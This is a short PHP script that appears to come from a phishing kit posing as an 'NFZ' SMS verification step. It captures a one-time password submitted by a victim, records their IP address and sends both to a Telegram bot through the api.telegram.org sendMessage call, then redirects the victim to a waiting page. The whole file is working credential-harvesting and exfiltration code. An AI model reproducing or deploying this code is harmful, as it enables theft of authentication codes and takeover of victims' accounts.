<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------- NFZ SMS  ----------\n";
$message .= "".$_POST['otp']."\n";
$message .= "----------   Z3CI   ----------\n";
$message .= "lp      : $ip\n";
$message .= "H0ST    : $hostname\n";

include 'configuration.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

header("Location: wait2.php");

?>
